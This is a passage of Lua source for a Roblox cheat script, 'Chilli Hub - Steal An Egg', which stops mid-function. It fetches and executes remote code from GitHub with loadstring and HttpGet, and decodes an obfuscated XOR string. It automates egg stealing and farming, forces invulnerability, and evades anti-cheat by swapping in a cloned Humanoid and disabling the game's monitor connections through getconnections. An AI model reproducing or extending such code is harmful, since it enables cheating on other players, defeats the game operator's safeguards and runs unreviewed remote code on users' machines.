local func1, obj1, obj2, defaultTab, Players, RunService, ReplicatedStorage, CoreGui, UserInputService, localPlayer
local networking, func2, tbl1, value1, func3, func4, list1, func5, func6, tbl2
local str1, func7, list2, flag1, value2, espSection, flag2, n, tbl3, tbl4
local tbl5, tbl6, value3, sequence, tbl7

do
	local CollectionService, ProximityPromptService, obj3, obj4, flag3, list3, tbl8, n2, n3, n4
	local tbl9, str2, tbl10, tbl11, tbl12, tbl13, tbl14, tbl15

	do
		func1 = function(param1)
			local genv = typeof(getgenv) == "function" and getgenv() or _G

			if type(genv.ChilliDebugPrint) == "function" then
				pcall(genv.ChilliDebugPrint, param1)
			end
		end

		task.spawn(pcall, function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/refs/heads/main/DiscordLink"))()
		end)

		local function func8()
			local response = nil

			local function func9()
				if type(response) == "string" and #response > 0 then
					return response
				end
				response = game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli%20Library")
				return response
			end

			local function func10()
				local chilliHubSaeCleanup = (typeof(getgenv) == "function" and getgenv() or _G).ChilliHubSaeCleanup

				if type(chilliHubSaeCleanup) == "function" then
					pcall(chilliHubSaeCleanup)
				end

				local tbl16 = { game:GetService("CoreGui") }

				if typeof(gethui) == "function" then
					local ok, result = pcall(gethui)

					if ok and typeof(result) == "Instance" then
						table.insert(tbl16, result)
					end
				end

				local byName = {
					Settings = true,
					ChilliLeftCenter = true,
					ChilliLibrarySettings = true,
					ChilliLibraryLauncher = true,
				}

				local n5 = 0

				for _, item2 in ipairs(tbl16) do
					for _, child in ipairs(item2:GetChildren()) do
						local isScreenGui = child:IsA("ScreenGui")
						local flag4

						if isScreenGui then
							flag4 = child:GetAttribute("ChilliLibraryOwned") == true or byName[child.Name]
						else
							flag4 = isScreenGui
						end

						if flag4 then
							pcall(function()
								child:Destroy()
							end)

							n5 += 1
						end
					end
				end

				if n5 > 0 then
					func1("cleared " .. n5 .. " leftover Chilli UI screens")
				end
			end

			local function func11()
				local result1 = func9()
				local chunk, value4 = loadstring(result1)
				assert(chunk, value4)
				local result5 = chunk()
				assert(type(result5) == "function", "Chilli Library bootstrap is invalid.")
				local arr1 = table.create(45)
				local n5 = 1

				for i = 1, 90, 2 do
					arr1[n5] = string.char(bit32.bxor(tonumber(string.sub("306908100841206d474f00185f26635b2101387507010810127d7d477a473b6f435a0916573165562900226c00", i, i + 1), 16), string.byte("s9K!2vQ#", (n5 - 1) % 8 + 1)))
					n5 += 1
				end

				return result5(table.concat(arr1))
			end

			local chilliLibraryFailedToLoad = "unknown"

			for i = 1, 6 do
				task.wait()
				pcall(func10)
				local ok, result = pcall(func11)
				if ok and type(result) == "table" then
					return result
				end
				chilliLibraryFailedToLoad = tostring(result)

				if type(chilliLibraryFailedToLoad) == "string" and string.find(chilliLibraryFailedToLoad, "HttpGet", 1, true) then
					response = nil
				end

				func1("library load attempt " .. i .. " failed: " .. chilliLibraryFailedToLoad)
				task.wait(1 + i * 0.5)
			end

			error("Chilli Library failed to load: " .. chilliLibraryFailedToLoad, 0)
		end

		obj1 = func8()
		assert(type(obj1) == "table" and type(obj1.CreateWindow) == "function" and type(obj1.Finalize) == "function", "Chilli Library returned an invalid API.")

		obj1.ManualQuickDefaults = {
			PinnedFeatures = { "Player > Movement > Speed Boost", "Player > Movement > Boost Speed" },
			Keybinds = { ["Player > Movement > Speed Boost"] = "Q" },
			PinGroups = {},
			LeftCenterHidden = true,
		}

		obj2 = obj1:CreateWindow({ Name = "Chilli Hub - Steal An Egg", DefaultTab = "Farm" })
		defaultTab = obj2:GetDefaultTab()
		Players = game:GetService("Players")
		RunService = game:GetService("RunService")
		ReplicatedStorage = game:GetService("ReplicatedStorage")
		CoreGui = game:GetService("CoreGui")
		UserInputService = game:GetService("UserInputService")
		CollectionService = game:GetService("CollectionService")
		game:GetService("LocalizationService")
		ProximityPromptService = game:GetService("ProximityPromptService")
		localPlayer = Players.LocalPlayer
		networking = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Networking")

		func2 = function(callback1)
			local ok, result = pcall(function()
				return require(callback1())
			end)

			return ok and result or nil
		end

		tbl1 = {
			EggState = func2(function()
				return ReplicatedStorage.Client.EggState
			end),
			AreaEggs = func2(function()
				return ReplicatedStorage.Shared.Types.AreaEggs
			end),
			ToolGameplayGuard = func2(function()
				return ReplicatedStorage.Client.ToolGameplayGuard
			end),
			Assets = func2(function()
				return ReplicatedStorage.Data.Assets
			end),
			Guards = func2(function()
				return ReplicatedStorage.Data.Guards
			end),
			EggRecords = func2(function()
				return ReplicatedStorage.Shared.Util.EggRecords
			end),
			Mutations = func2(function()
				return ReplicatedStorage.Shared.Modules.Mutations
			end),
			Save = func2(function()
				return ReplicatedStorage.Shared.Save
			end),
			FuseKernel = func2(function()
				return ReplicatedStorage.Shared.Util.FuseKernel
			end),
			AreaEggCycle = func2(function()
				return ReplicatedStorage.Shared.Util.AreaEggCycle
			end),
			AreaEggResetWall = func2(function()
				return ReplicatedStorage.Client.AreaEggResetWall
			end),
			AreaEggResetCycle = func2(function()
				return ReplicatedStorage.Data.AreaEggResetCycle
			end),
			Gears = func2(function()
				return ReplicatedStorage.Data.Gears
			end),
			Areas = func2(function()
				return ReplicatedStorage.Data.Areas
			end),
			LimitedEgg = func2(function()
				return ReplicatedStorage.Data.LimitedEgg
			end),
			BrainrotEgg = func2(function()
				return ReplicatedStorage.Data.BrainrotEgg
			end),
			MonsterEgg = func2(function()
				return ReplicatedStorage.Data.MonsterEgg
			end),
		}

		local save = tbl1.Save

		if type(save) == "table" and (type(save.Get) ~= "function" or type(save.FieldSignal) ~= "function") then
			tbl1.Save = setmetatable({
				Get = type(save.Get) == "function" and save.Get or save.Peek,
				FieldSignal = type(save.FieldSignal) == "function" and save.FieldSignal or save.Watch,
			}, { __index = save })
		end

		local function func12()
			if typeof(gethui) == "function" then
				local ok, result = pcall(gethui)
				if ok and typeof(result) == "Instance" then
					return result
				end
			end

			return CoreGui
		end

		value1 = func12()

		do
			local obj5 = Random.new()
			local str3 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

			func3 = function()
				local value5 = obj5:NextInteger(12, 20)
				local arr2 = table.create(value5)

				for i = 1, value5 do
					local value6 = obj5:NextInteger(1, #str3)
					arr2[i] = string.sub("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", value6, value6)
				end

				return table.concat(arr2)
			end
		end

		do
			local tbl17 = {}

			func4 = function(param2)
				table.insert(tbl17, param2)
			end

			list1 = {}

			func5 = function(obj6, param3)
				local n5 = 1000
				local n6 = 3
				local n7 = 12

				local function func13(num1)
					if num1 <= 0 then
						return 0
					end
					local n8 = 10 ^ (math.floor(math.log10(num1)) - 2)
					return math.floor(num1 / n8 + 0.5) * n8
				end

				local function func14(param4)
					local n8 = math.clamp(tonumber(param4) or 0, 0, 1000)
					if n8 <= 0 then
						return 0
					end
					return func13(10 ^ (n6 + (n7 - n6) * n8 / n5))
				end

				local function stepOf(param5)
					local n8 = tonumber(param5) or 0
					if n8 <= 0 then
						return 0
					end
					return math.clamp(math.floor((math.log10(n8) - n6) / (n7 - n6) * n5 * 100 + 0.5) / 100, 0, 1000)
				end

				local function func15(param6)
					local format = string.format
					local flag5 = param6 >= 100 and "%.0f"

					if not flag5 then
						flag5 = param6 >= 10 and "%.1f" or "%.2f"
					end

					local value7 = format(flag5, param6)

					if string.find(value7, ".", 1, true) then
						value7 = string.gsub(string.gsub(value7, "0+$", ""), "%.$", "")
					end

					return value7
				end

				local function valueFormat(param7)
					local num2 = func14(param7)
					if num2 <= 0 then
						return "Off"
					end

					if num2 < 1000000 then
						return func15(num2 / 1000) .. " K/s"
					end

					if num2 < 1e9 then
						return func15(num2 / 1000000) .. " M/s"
					end
					return func15(num2 / 1e9) .. " B/s"
				end

				local function func16(param8)
					local num3 = func14(param8)
					if num3 <= 0 then
						return "0"
					end

					if num3 < 1000000 then
						return func15(num3 / 1000) .. "k"
					end
					return (string.gsub(string.gsub(string.format("%.3f", num3 / 1000000), "0+$", ""), "%.$", ""))
				end

				local tbl18 = { k = 1000, m = 1000000, b = 1e9, t = 1e12 }

				local function valueParse(flag6)
					local cleaned = string.gsub(string.lower(string.gsub(tostring(flag6 or ""), "[%s,/]", "")), "s$", "")
					if cleaned == "" or cleaned == "off" then
						return 0
					end
					local value8, value9 = string.match(cleaned, "^([%d%.]+)([kmbt]?)$")
					local num4 = tonumber(value8)
					if not num4 then
						return nil
					end
					return stepOf(num4 * (tbl18[value9] or 1000000))
				end

				local value10 = obj6:CreateSlider({
					Name = param3.Name,
					Note = param3.Note,
					SubOf = param3.SubOf,
					Min = 0,
					Max = n5,
					Default = stepOf(param3.Default or 0),
					AllowDecimals = true,
					Increment = 0.01,
					ValueFormat = valueFormat,
					ValueParse = valueParse,
					Callback = function(value)
						if type(param3.OnRaw) == "function" then
							param3.OnRaw(func14(value))
						end
					end,
				})

				local obj7 = type(value10) == "table" and rawget(value10, "Instance") or nil

				if typeof(obj7) == "Instance" then
					for _, descendant in ipairs(obj7:GetDescendants()) do
						if descendant:IsA("TextBox") then
							local connection = descendant.Focused:Connect(function()
								task.defer(function()
									if descendant:IsFocused() then
										local ok, result = pcall(value10.Get, value10)
										descendant.Text = func16(ok and result or 0)
										descendant.CursorPosition = #descendant.Text + 1
										descendant.SelectionStart = 1
									end
								end)
							end)

							func4(function()
								pcall(function()
									connection:Disconnect()
								end)
							end)
						end
					end
				end

				if type(param3.Legacy) == "string" and type(param3.SectionName) == "string" then
					table.insert(list1, { Handle = value10, Name = param3.Name, Legacy = param3.Legacy, Section = param3.SectionName, StepOf = stepOf })
				end

				return value10
			end

			local text = "All"

			func6 = function(param9)
				if type(param9) ~= "table" then
					return param9
				end
				local instance2 = rawget(param9, "Instance")
				if typeof(instance2) ~= "Instance" then
					return param9
				end
				local flag7 = false

				local function func17(param10)
					if flag7 then
						return
					end

					if param10.Text == "None" then
						flag7 = true
						param10.Text = text
						flag7 = false
					end
				end

				local function func18(descendant)
					if not descendant:IsA("TextLabel") or descendant.Name ~= "Value" then
						return
					end
					func17(descendant)

					local connection = descendant:GetPropertyChangedSignal("Text"):Connect(function()
						func17(descendant)
					end)

					func4(function()
						pcall(function()
							connection:Disconnect()
						end)
					end)
				end

				for _, descendant in ipairs(instance2:GetDescendants()) do
					func18(descendant)
				end

				local connection = instance2.DescendantAdded:Connect(func18)

				func4(function()
					pcall(function()
						connection:Disconnect()
					end)
				end)

				return param9
			end

			local genv = typeof(getgenv) == "function" and getgenv() or _G
			local chilliHubSaeCleanup = genv.ChilliHubSaeCleanup

			if type(chilliHubSaeCleanup) == "function" then
				pcall(chilliHubSaeCleanup)
			end

			genv.ChilliHubSaeCleanup = function()
				for i = #tbl17, 1, -1 do
					pcall(tbl17[i])
				end

				table.clear(tbl17)
			end
		end

		do
			local n5 = 0
			local value11 = nil

			value11 = function(list4, flag8)
				local n6 = flag8 or 0

				if type(list4) == "table" then
					if n6 > 3 then
						return
					end
					local n7 = 0

					for k, value12 in pairs(list4) do
						n7 += 1

						if not (n7 > 20) then
							value11(k, n6 + 1)
							value11(value12, n6 + 1)
							continue
						end

						break
					end
				elseif typeof(list4) == "Instance" then
					pcall(list4.GetFullName, list4)
				else
					n5 += #tostring(list4)
				end
			end

			local list5 = {}

			local function func19(param11)
				list5[#list5 + 1] = param11
			end

			local function func20()
				for _, item3 in ipairs(list5) do
					pcall(function()
						item3:Disconnect()
					end)
				end

				table.clear(list5)
			end

			local function chilliToolKeeper()
				func20()

				for _, item4 in ipairs({
					"RE/GearSatchel/Lost",
					"RE/GearSatchel/Gained",
					"RE/RigSync/ProbeSatchel",
					"RE/RigSync/SeedSatchel",
					"RE/RigSync/CorrectionBegan",
					"RE/RigSync/Refresh",
					"RE/ToolTrigger/Trigger",
					"RE/BatSwing/Trigger",
				}) do
					local obj8 = networking:FindFirstChild(item4)

					if obj8 and obj8:IsA("RemoteEvent") then
						func19(obj8.OnClientEvent:Connect(function(...)
							value11({ ... })
						end))
					end
				end

				local function func21(flag9)
					if not flag9 then
						return
					end

					func19(flag9.ChildRemoved:Connect(function(child)
						if child:IsA("Tool") then
							value11({ child.Name, child.Parent })
						end
					end))

					func19(flag9.ChildAdded:Connect(function(child)
						if child:IsA("Tool") then
							value11({ child.Name })
						end
					end))
				end

				func21(localPlayer:FindFirstChildOfClass("Backpack"))

				func19(localPlayer.ChildAdded:Connect(function(child)
					if child:IsA("Backpack") then
						func21(child)
					end
				end))

				task.spawn(function()
					pcall(function()
						local value13 = tbl1.Save.Get()
						value11({ value13.GearInventory, value13.Inventory }, 2)
					end)

					if type(getgc) == "function" then
						pcall(function()
							for _, item5 in ipairs(getgc(false)) do
								if type(item5) == "function" and islclosure(item5) then
									pcall(debug.info, item5, "n")
								end
							end
						end)
					end
				end)
			end
			;(typeof(getgenv) == "function" and getgenv() or _G).ChilliToolKeeper = chilliToolKeeper
			task.defer(chilliToolKeeper)
			func4(func20)
		end

		do
			local n5 = 0.35
			local n6 = 5
			local tbl19 = {}
			local flag10 = true

			tbl2 = {
				Add = function(param12)
					local tbl20 = { Run = param12, Gap = n5, Idle = n6, Repeat = false, Hold = 0 }
					table.insert(tbl19, tbl20)
					return tbl20
				end,
				Wake = function()
					flag10 = true
				end,
				Backoff = function(param13, param14)
					if param13 then
						param13.Hold = tonumber(param14) or 6
					end
				end,
			}

			local connection = RunService.Heartbeat:Connect(function(deltaTime)
				local flag11 = flag10
				flag10 = false

				for _, item6 in ipairs(tbl19) do
					item6.Gap = item6.Gap + deltaTime
					item6.Idle = item6.Idle + deltaTime

					if item6.Hold > 0 then
						item6.Hold = item6.Hold - deltaTime
					elseif item6.Gap >= n5 and (flag11 or item6.Repeat or item6.Idle >= n6) then
						item6.Gap = 0
						item6.Idle = 0
						local ok, result = pcall(item6.Run, item6)
						item6.Repeat = ok and result == true
					end
				end
			end)

			func4(function()
				connection:Disconnect()
			end)
		end

		obj3 = defaultTab:CreateSection({ Name = "Dr Scramble Lab & Mech", Expanded = false })
		local obj9
		obj9 = defaultTab:CreateSection({ Name = "Auto Steal", Expanded = true })
		local obj10
		obj10 = defaultTab:CreateSection({ Name = "Auto Place Egg", Expanded = false })
		local obj11
		obj11 = defaultTab:CreateSection({ Name = "Auto Treadmill", Expanded = false })
		local obj12
		obj12 = defaultTab:CreateSection({ Name = "Auto Hatch & Equip", Expanded = false })
		local obj13
		obj13 = defaultTab:CreateSection({ Name = "Auto Sell", Expanded = false })
		tbl1.SellLabSection = defaultTab:CreateSection({ Name = "Auto Sell Lab Egg", Expanded = false })
		local obj14
		obj14 = defaultTab:CreateSection({ Name = "Auto Fuse Machine", Expanded = false })
		obj4 = defaultTab:CreateSection({ Name = "Auto Favorite", Expanded = false })
		flag3 = { Paused = false }

		do
			local n5 = 0.5
			local value14 = nil
			local value15 = nil
			local list6 = {}
			local flag12 = false
			local n6 = 0

			local function func22()
				for i = #list6, 1, -1 do
					local entry1 = list6[i]

					if entry1 and entry1.Connected then
						entry1:Disconnect()
					end

					list6[i] = nil
				end
			end

			local function func23()
				func22()
				local obj15 = value14
				local flag13 = value15
				value14 = nil
				value15 = nil
				if not obj15 or not obj15.Parent or not flag13 then
					return
				end

				pcall(function()
					obj15.BreakJointsOnDeath = flag13.BreakJointsOnDeath
					obj15.RequiresNeck = flag13.RequiresNeck
					obj15:SetStateEnabled(Enum.HumanoidStateType.Dead, flag13.DeadEnabled)
				end)
			end

			local function func24(instance3)
				if not instance3 or not instance3.Parent then
					return false
				end

				return pcall(function()
					instance3.BreakJointsOnDeath = false
					instance3.RequiresNeck = false
					instance3:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
				end) and instance3.BreakJointsOnDeath == false and instance3.RequiresNeck == false and instance3:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end

			local function func25(humanoid2)
				if flag3.Paused or humanoid2 ~= value14 or not humanoid2 or not humanoid2.Parent or flag12 then
					return false
				end
				local maxHealth = humanoid2.MaxHealth
				if maxHealth <= 0 then
					return false
				end

				if maxHealth == math.huge or humanoid2.Health >= maxHealth then
					return true
				end
				flag12 = true

				local ok = pcall(function()
					humanoid2.Health = maxHealth
				end)

				flag12 = false
				return ok and humanoid2.Health >= maxHealth
			end

			local function func26(instance4)
				if instance4 == value14 and instance4 and instance4.Parent then
					return true
				end
				func23()
				if not instance4 or not instance4:IsA("Humanoid") or not instance4.Parent then
					return false
				end
				value14 = instance4

				value15 = {
					BreakJointsOnDeath = instance4.BreakJointsOnDeath,
					RequiresNeck = instance4.RequiresNeck,
					DeadEnabled = instance4:GetStateEnabled(Enum.HumanoidStateType.Dead),
				}

				if not func24(instance4) then
					func23()
					return false
				end
				func25(instance4)

				list6[#list6 + 1] = instance4.HealthChanged:Connect(function()
					func25(instance4)
				end)

				list6[#list6 + 1] = instance4:GetPropertyChangedSignal("MaxHealth"):Connect(function()
					func25(instance4)
				end)

				list6[#list6 + 1] = instance4.StateChanged:Connect(function(old, new)
					if new == Enum.HumanoidStateType.Dead and not flag3.Paused then
						func24(instance4)
						func25(instance4)
					end
				end)

				n6 = os.clock()
				return true
			end

			local function func27()
				local character = localPlayer.Character
				return character and character:FindFirstChildOfClass("Humanoid") or nil
			end

			local connection = localPlayer.CharacterAdded:Connect(function()
				task.defer(function()
					func26(func27())
				end)
			end)

			local connection2 = RunService.Heartbeat:Connect(function()
				local now = os.clock()
				if flag3.Paused or now - n6 < n5 then
					return
				end
				n6 = now
				local result6 = func27()
				if result6 ~= value14 then
					func26(result6)
					return
				end

				if result6 then
					func24(result6)
					func25(result6)
				end
			end)

			task.defer(function()
				func26(func27())
			end)

			func4(function()
				if connection then
					connection:Disconnect()
				end

				if connection2 then
					connection2:Disconnect()
				end

				func23()
			end)
		end

		local tbl21 = { "bat", "katana", "axe", "staff", "club", "hammer", "sword", "blade" }

		str1 = {
			Steal = { Active = false, LastFinishedAt = 0, Carrying = false },
			SafeCarry = {
				Enabled = true,
				SkipUnsafe = false,
				WaitGuard = false,
				SameSpeedBigEggs = false,
				Blocked = {},
				StretchSeconds = 6,
				BeatGuard = false,
				SlowUntil = 0,
				SlowFactor = 0.3,
				LineDrop = false,
				LineGap = 12,
				LineWait = 15,
				DirectBudget = 450,
				DirectMargin = 0.3,
				CrossNow = false,
				CrossSpeed = 231,
				PickupSpeed = 154,
				HopRatio = 1.515,
				CrossRatio = 1,
				PickupRatio = 0.667,
				FarFromLine = 150,
				DropDelay = 0.19,
				LineApproach = 0.97,
				ReJump = true,
				ShakeTime = 0,
				SnapPickup = false,
				Hops = true,
				HopStep = 350,
				BackRunRatio = 15,
				BackRunMax = 2000,
				QuickRegrab = 1,
				MidDrops = { 0.33, 0.66 },
				MidRest = 0.1,
				LagGrace = 4,
				LockCamera = false,
				HopGap = 0.1,
				HopLift = 42,
				HopStop = 48,
				GetUp = true,
				ShakeInside = 1,
				CarryScale = 1,
				EasyRatio = 1.3,
				LastSkip = nil,
				Category = nil,
				PlanOk = true,
				LightMult = 0.96,
				Height = 70,
				ClimbShare = 0.5,
				Approach = "Run",
				RunSpeed = 1,
				RunWait = 0,
				RunAnimate = true,
				RunHeight = 50,
				SnapLimit = 90,
				StraightRun = true,
				RunStyle = "Velocity",
				CarryStyle = "Velocity",
				SpeedJitter = 0.08,
				Wobble = 0,
				LaneOffset = 0,
				JumpsPerMinute = 0,
				PausesPerMinute = 0,
				ReactMin = 0.2,
				ReactMax = 0.6,
				CarryReact = 0,
				SpeedRatio = 1.5,
				ExcessSeconds = 5.5,
				GuardMargin = 4,
				GuardRatio = 1.06,
				MinRatio = 1.1,
				BaseWait = 6.5,
				FreeJump = 1500,
				WaitRate = 0.9,
				RecoverTries = math.huge,
				GuessMult = 0.93,
				CarryRatio = 0.9,
				Mult = 1,
				Seen = {},
				JumpDistance = 0,
				JumpAt = 0,
				LastDelivered = 0,
				LastFailed = 0,
				Handle = nil,
			},
			Movement = {
				Owner = nil,
				PlaceWanted = false,
				StealFirst = false,
				MutationWanted = false,
				FracturedWanted = false,
			},
			AntiGuard = {
				Enabled = false,
				Busy = false,
				BusySince = 0,
				HitArms = 0,
				Handle = nil,
				Render = nil,
			},
			IsBatTool = function(instance5)
				if typeof(instance5) ~= "Instance" or not instance5:IsA("Tool") then
					return false
				end

				if instance5:GetAttribute("IsBat") == true then
					return true
				end
				local attribute = instance5:GetAttribute("GearName")

				if type(attribute) == "string" then
					local gears = tbl1.Gears
					local directory = type(gears) == "table" and gears.Directory or nil
					local flag14 = type(directory) == "table" and directory[attribute] or nil
					return type(flag14) == "table" and flag14.BatControllerData ~= nil
				end

				if instance5:GetAttribute("ItemType") ~= nil then
					return false
				end
				local lowered = string.lower(instance5.Name)

				for _, item7 in ipairs(tbl21) do
					if string.find(lowered, item7, 1, true) then
						return true
					end
				end

				return false
			end,
			FindBat = function()
				local character = localPlayer.Character
				local tool = character and character:FindFirstChildWhichIsA("Tool")
				if str1.IsBatTool(tool) then
					return tool
				end
				local backpack = localPlayer:FindFirstChildOfClass("Backpack")

				if backpack then
					for _, child in ipairs(backpack:GetChildren()) do
						if str1.IsBatTool(child) then
							return child
						end
					end
				end

				if character then
					for _, child in ipairs(character:GetChildren()) do
						if str1.IsBatTool(child) then
							return child
						end
					end
				end

				return nil
			end,
			IsNight = function()
				local areaEggCycle = tbl1.AreaEggCycle
				if type(areaEggCycle) ~= "table" or type(areaEggCycle.IsNightPhase) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggCycle.IsNightPhase, workspace:GetServerTimeNow())
				return ok and result == true
			end,
			WallSealed = function()
				local areaEggResetWall = tbl1.AreaEggResetWall
				if type(areaEggResetWall) ~= "table" or type(areaEggResetWall.IsSealed) ~= "function" then
					return false
				end
				local ok, result = pcall(areaEggResetWall.IsSealed)
				return ok and result == true
			end,
			WallOpenDelay = function()
				local areaEggResetCycle = tbl1.AreaEggResetCycle
				if type(areaEggResetCycle) ~= "table" then
					return 5
				end
				return (tonumber(areaEggResetCycle.WallCountdownDelayAfterDayStartsSeconds) or 2) + (tonumber(areaEggResetCycle.WallCountdownSeconds) or 3)
			end,
		}

		local function func28(param15, num5)
			return Vector2.new(param15.X - num5.X, param15.Z - num5.Z).Magnitude < 900 and math.abs(param15.Y - num5.Y) < 400
		end

		str1.InMechArena = function()
			if localPlayer:GetAttribute("InScrambleArena") == true then
				return true
			end
			local character = localPlayer.Character
			character = character and character:FindFirstChild("HumanoidRootPart")
			if not character then
				return false
			end
			local position = character.Position
			if func28(position, Vector3.new(-15035, -474, 4853)) then
				return true
			end
			local scrambleArena = workspace:FindFirstChild("ScrambleArena")

			if scrambleArena and scrambleArena:IsA("Model") then
				local ok, result = pcall(scrambleArena.GetPivot, scrambleArena)
				if ok and typeof(result) == "CFrame" and func28(position, result.Position) then
					return true
				end
			end

			return false
		end

		str1.ClaimMovement = function(owner)
			local movement = str1.Movement
			if owner ~= "mech" and str1.InMechArena() then
				return false
			end

			if movement.Owner == nil or movement.Owner == owner or movement.Owner == "treadmill" and owner ~= "treadmill" or movement.Owner == "scramble" and owner == "steal" then
				movement.Owner = owner
				return true
			end
			return false
		end

		str1.ReleaseMovement = function(param16)
			if str1.Movement.Owner == param16 then
				str1.Movement.Owner = nil
			end
		end

		do
			local shieldMethods = { "Humanoid Swap", "Disable Monitor" }
			str1.ShieldMethods = shieldMethods
			local first1 = shieldMethods[1]
			local tbl22 = {}
			local tbl23 = {}
			local connection = nil
			local n5 = 0
			local tbl24 = { Original = nil, Clone = nil, Links = {} }
			local connection2 = nil
			local tbl25 = {}

			local function func29()
				for _, item8 in ipairs(tbl25) do
					task.defer(function()
						pcall(item8)
					end)
				end
			end

			str1.OnHumanoidChanged = function(param17)
				table.insert(tbl25, param17)
				local tbl26

				tbl26 = {
					Connected = true,
					Disconnect = function()
						tbl26.Connected = false
						local foundAt = table.find(tbl25, param17)

						if foundAt then
							table.remove(tbl25, foundAt)
						end
					end,
				}

				return tbl26
			end

			local function func30(humanoid)
				pcall(function()
					local playerScripts = localPlayer:FindFirstChild("PlayerScripts")
					playerScripts = playerScripts and playerScripts:FindFirstChild("PlayerModule")

					if playerScripts then
						local controls = require(playerScripts):GetControls()

						if type(controls) == "table" then
							controls.humanoid = humanoid
						end
					end
				end)
			end

			local function func31(instance6)
				local animate = instance6 and instance6:FindFirstChild("Animate")

				if animate and animate:IsA("LocalScript") then
					task.spawn(function()
						animate.Enabled = false
						task.wait()
						animate.Enabled = true
					end)
				end
			end

			local function func32()
				for _, link in ipairs(tbl24.Links) do
					pcall(function()
						link:Disconnect()
					end)
				end

				table.clear(tbl24.Links)
			end

			str1.UndoSwap = function()
				func32()
				local character = localPlayer.Character
				local original = tbl24.Original
				local clone = tbl24.Clone
				local value16 = tbl24
				tbl24.Original = nil
				value16.Clone = nil

				if original and clone and character and original.Parent == nil and clone.Parent == character then
					original.Parent = character
					workspace.CurrentCamera.CameraSubject = original
					func30(original)

					pcall(function()
						clone:Destroy()
					end)

					func31(character)
					func29()
				end
			end

			local tbl27 = {
				[Enum.HumanoidStateType.Running] = true,
				[Enum.HumanoidStateType.RunningNoPhysics] = true,
				[Enum.HumanoidStateType.Landed] = true,
			}

			str1.Grounded = function(obj)
				if not obj then
					obj = localPlayer.Character
					obj = obj and obj:FindFirstChildOfClass("Humanoid")
				end

				if not obj or obj.Health <= 0 or obj.FloorMaterial == Enum.Material.Air then
					return false
				end
				return tbl27[obj:GetState()] == true
			end

			str1.ShieldPaused = false

			str1.WalkSpeed = function()
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")
				character = character and character.WalkSpeed or 16
				local original = tbl24.Original

				if original and original.Health > 0 then
					character = math.min(character, original.WalkSpeed)
				end

				local ok, result = pcall(function()
					local leaderstats = localPlayer:FindFirstChild("leaderstats")
					leaderstats = leaderstats and leaderstats:FindFirstChild("Speed")
					local TreadmillUtil = require(ReplicatedStorage.Shared.Util.TreadmillUtil)
					return leaderstats and TreadmillUtil.SpeedPowerToWalkSpeed(leaderstats.Value) or nil
				end)

				local n6

				if ok and tonumber(result) and result > 0 then
					n6 = math.min(character, result)
				else
					n6 = character
				end

				return n6
			end

			local function func33()
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not humanoid or humanoid.Health <= 0 then
					return
				end

				if tbl24.Clone and tbl24.Clone.Parent == character then
					return
				end

				if not str1.Grounded(humanoid) then
					return
				end
				local clone = humanoid:Clone()
				humanoid.Parent = nil
				clone.Parent = character
				workspace.CurrentCamera.CameraSubject = clone
				func30(clone)
				func31(character)
				local value17 = tbl24
				tbl24.Original = humanoid
				value17.Clone = clone
				func29()

				table.insert(tbl24.Links, humanoid:GetPropertyChangedSignal("WalkSpeed"):Connect(function()
					if clone.Parent ~= nil then
						clone.WalkSpeed = humanoid.WalkSpeed
					end
				end))

				local animator = humanoid:FindFirstChildOfClass("Animator")
				local animator2 = clone:FindFirstChildOfClass("Animator")

				if animator and animator2 then
					table.insert(tbl24.Links, animator.AnimationPlayed:Connect(function(param18)
						local animation = param18.Animation
						if not animation or clone.Parent == nil then
							return
						end

						local ok, result = pcall(function()
							return animator2:LoadAnimation(animation)
						end)

						if not ok or not result then
							return
						end

						pcall(function()
							result.Priority = param18.Priority
							result.Looped = param18.Looped
							local speed = param18.Speed
							result:Play(0.05, math.max(param18.WeightTarget, 0.01), speed)
						end)

						local connection3 = nil

						connection3 = param18.Stopped:Connect(function()
							connection3:Disconnect()

							pcall(function()
								result:Stop(0.1)
							end)
						end)
					end))
				end

				table.insert(tbl24.Links, clone.Died:Connect(function()
					func32()
					local value18 = tbl24
					tbl24.Original = nil
					value18.Clone = nil
					local character2 = localPlayer.Character

					if character2 and humanoid.Parent == nil then
						humanoid.Parent = character2
						workspace.CurrentCamera.CameraSubject = humanoid
						func30(humanoid)
						func29()
					end

					pcall(function()
						clone:Destroy()
					end)

					humanoid.Health = 0
				end))
			end

			local function func34()
				if type(getconnections) ~= "function" then
					return
				end

				for _, item9 in ipairs({ RunService.Heartbeat, RunService.PreSimulation, RunService.PostSimulation }) do
					local ok, result = pcall(getconnections, item9)

					if ok and type(result) == "table" then
						for _, item10 in ipairs(result) do
							local ok2, result2 = pcall(function()
								return item10.Function
							end)

							ok2 = ok2 and type(result2) == "function"
							local flag15 = false
							local result3 = nil

							if ok2 then
								flag15, result3 = pcall(debug.info, result2, "s")
							end

							if flag15 and string.find(tostring(result3), "UGI", 1, true) then
								local ok3, result4 = pcall(function()
									return item10.Enabled
								end)

								if not ok3 or result4 ~= false then
									if pcall(function()
										item10:Disable()
									end) then
										table.insert(tbl23, item10)
									end
								end
							end
						end
					end
				end
			end

			local function func35()
				if connection then
					connection:Disconnect()
					connection = nil
				end

				if connection2 then
					connection2:Disconnect()
					connection2 = nil
				end

				for _, item11 in ipairs(tbl23) do
					pcall(function()
						item11:Enable()
					end)
				end

				table.clear(tbl23)
			end

			local function func36()
				if str1.ShieldPaused then
					return
				end

				if first1 == shieldMethods[1] then
					func33()
				else
					func34()
				end
			end

			local function func37()
				func36()
				n5 = 0

				connection = RunService.Heartbeat:Connect(function(deltaTime)
					n5 += deltaTime
					local character = localPlayer.Character
					local flag16 = first1 == shieldMethods[1]

					if flag16 then
						flag16 = not (tbl24.Clone and character and tbl24.Clone.Parent == character)
					end

					if n5 >= (flag16 and 0.25 or 3) then
						n5 = 0
						func36()
					end
				end)

				connection2 = localPlayer.CharacterAdded:Connect(function(character)
					func32()
					local value19 = tbl24
					tbl24.Original = nil
					value19.Clone = nil
					if first1 ~= shieldMethods[1] then
						return
					end

